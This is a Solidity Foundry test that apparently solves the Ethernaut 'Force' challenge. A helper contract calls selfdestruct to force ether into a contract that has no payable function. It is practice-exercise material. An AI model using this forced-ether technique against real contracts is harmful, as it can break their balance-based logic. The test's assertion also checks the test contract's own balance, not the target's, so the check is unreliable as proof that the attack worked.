// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Force} from "../src/Force.sol";

contract ForceTest is Test {

    Force forc;

    attackContract attack;

    function setUp() public {

        forc = new Force();

        attack = new attackContract(forc);

        vm.deal(address(attack), 1 ether);

    }


    function testBalanceofForceGreatenThanZero() public {

        vm.prank(address(attack));
        attack.attack();

        console.log(address(this).balance);

        assert(address(this).balance != 0);

    }
    
    
}

contract attackContract {

    Force forc;

    constructor(Force _forc) payable {

        forc = _forc;

    }

    function attack() external payable {

        selfdestruct(payable(address(forc)));
    }
}